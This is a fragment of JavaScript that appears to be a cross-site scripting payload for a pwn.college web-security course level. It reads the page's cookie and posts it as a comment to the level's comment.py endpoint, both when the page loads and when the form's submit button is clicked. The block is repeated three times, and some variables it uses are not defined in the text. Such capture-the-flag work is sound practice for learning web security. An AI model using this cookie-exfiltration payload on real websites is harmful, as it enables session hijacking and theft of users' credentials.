formData.append('comment', cookie);
formData.append('submit', 'Submit your comment');
fetch('http://cse545-web.pwn.college/~level07/cgi-bin/comment.py', { method: 'POST', body: formData, headers: {cookie: cookie}});

document.addEventListener("DOMContentLoaded", function(){
  formData.append('comment', cookie);
  formData.append('submit', 'Submit your comment');
  fetch('http://cse545-web.pwn.college/~level07/cgi-bin/comment.py', { method: 'POST', body: formData, headers: {cookie: cookie}});
  document.forms[0].submit.addEventListener('click', function(){
    document.forms[0]['comment'].value = document.cookie;
    formData.append('comment', cookie);
formData.append('submit', 'Submit your comment');
fetch('http://cse545-web.pwn.college/~level07/cgi-bin/comment.py', { method: 'POST', body: formData, headers: {cookie: cookie}});
  }, false);
});
